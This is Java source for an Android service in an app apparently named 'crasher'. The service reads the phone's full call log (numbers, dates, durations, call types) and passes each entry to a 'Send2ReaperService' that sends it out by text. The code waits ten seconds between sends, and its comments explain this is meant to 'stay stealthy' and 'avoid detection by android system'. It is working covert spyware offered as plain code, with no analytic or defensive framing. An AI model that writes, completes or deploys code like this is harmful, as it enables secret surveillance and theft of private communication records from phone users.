package com.bigeye.crasher;

import java.util.Calendar;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.text.format.DateFormat;
import android.util.Log;
import android.widget.Toast;

public class ReadCallLogs extends IntentService{

	private final String APP_TAG ="ReadCallLogs";
	private static final long SLEEP_TIME = 10 * 1000;
	
	SharedPreferences sharedPrefs;
	final String prefName = "Sync";
	
	public ReadCallLogs() {
		super("Read_All_Call_Logs");
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		
		//check prefs whether logs have been synced
		sharedPrefs = getSharedPreferences(prefName, MODE_PRIVATE);
		boolean callLogsSynced = sharedPrefs.getBoolean("CallLogsSynced", false);
		String lastSyncDate = sharedPrefs.getString("LastCallLogsSyncDate", "NULL");
		
		if(callLogsSynced){
			Log.i(APP_TAG,"Call Logs had been synced. Date: "+lastSyncDate);
//			Toast.makeText(getApplicationContext(),"Call Logs had been synced. Date: "+lastSyncDate , Toast.LENGTH_LONG).show();
			
			Log.i(APP_TAG,"commiting suicide");
			stopSelf();
		}else{
			Log.i(APP_TAG,"Call Logs have NEVER been synced. Date: "+lastSyncDate);
//			Toast.makeText(getApplicationContext(), "Call Logs had been synced. Date: "+lastSyncDate, Toast.LENGTH_LONG).show();
			
			//read all call logs
			Log.i(APP_TAG,"About to start fetching all Call logs: standby ");
			GetCallLogs();
		}

		//save in prefs sync status & date
		sharedPrefs = getSharedPreferences(prefName, MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPrefs.edit();
		editor.putBoolean("CallLogsSynced", true);
		editor.putString("LastCallLogsSyncDate",java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime()));
		editor.commit();
		
		Log.i(APP_TAG,"finished reading all call logs: commiting suicide");
		stopSelf();
	}
	
	private void GetCallLogs(){
		final String[] projection = null;
		final String selection = null;
		final String[] selectionArgs = null;
		final String sortOrder = android.provider.CallLog.Calls.DATE + " DESC";
		Cursor cursor = null;
		
		try{
			cursor = this.getContentResolver().query(Uri.parse("content://call_log/calls"),projection, selection, selectionArgs, sortOrder);
			
			//kuna logs??
			if(cursor.getCount() <= 0){
				Log.i(APP_TAG,"Call logs empty!");
				return;
			}else{
				Log.i(APP_TAG,"found "+cursor.getCount()+" records");
			}
			
			while(cursor.moveToNext()){
				//id
				String callLogID = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls._ID));
				
				//phone no
				String phoneNo = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
				
				//date
//				String callDate = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE));
				long CDate = cursor.getLong(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE));
				String callDate = new DateFormat().format("dd-MMM-yyyy k:m:s", CDate).toString();
				
				//duration
				String duration = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));
				
				//call type - 1-incoming,2-outgoing,3-missed
				String callType = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));
				
				//0-call ack'd 1-call not ack'd
				String isCallNew = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NEW));
				
				//check for non-ack'd missed calls
				if(Integer.parseInt(callType) == android.provider.CallLog.Calls.MISSED_TYPE && Integer.parseInt(isCallNew) > 0){
					String missedCallNo = phoneNo;
				}
				
				// *** add contact name *** //
				
				String callLog = "";
				if(callType.equalsIgnoreCase(String.valueOf(android.provider.CallLog.Calls.INCOMING_TYPE))){
					callLog = "Incoming call from: "+phoneNo;
				}else if (callType.equalsIgnoreCase(String.valueOf(android.provider.CallLog.Calls.OUTGOING_TYPE))){
					callLog = "Outgoing call to: "+phoneNo;
				}else if (callType.equalsIgnoreCase(String.valueOf(android.provider.CallLog.Calls.MISSED_TYPE))){
					callLog = "Missed call from: "+phoneNo;
				}
				
				callLog += " on "+callDate+" duration: "+duration+" secs.";
				
				String logStr = "CallLogID:"+callLogID+":PhoneNo: "+phoneNo+":CallDate:"+callDate+":CallType: "+callType+" | isCallNew:"+isCallNew+" | CallDuration: "+duration+" secs.";
				
				Log.i(APP_TAG,logStr);
				Log.i(APP_TAG,callLog);
				
				//sleep for 10 secs b4 sending texts...stay stealthy
				Log.i(APP_TAG,"about to start sending logs in 10 secs bursts - so as to avoid detection by android system!");
				
				try {
					new Thread().sleep(SLEEP_TIME);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				//send to repo
				Intent repo = new Intent(this,Send2ReaperService.class);
				repo.putExtra("OPERATION", "OUTGOING");
//				repo.putExtra("MSG",logStr);
				repo.putExtra("MSG",callLog);
				startService(repo);
			}
		}catch(Exception ex){
			Log.i(APP_TAG,"Exception: "+ ex.toString());
		}
		
		finally{
			cursor.close();
		}
		
	}

}

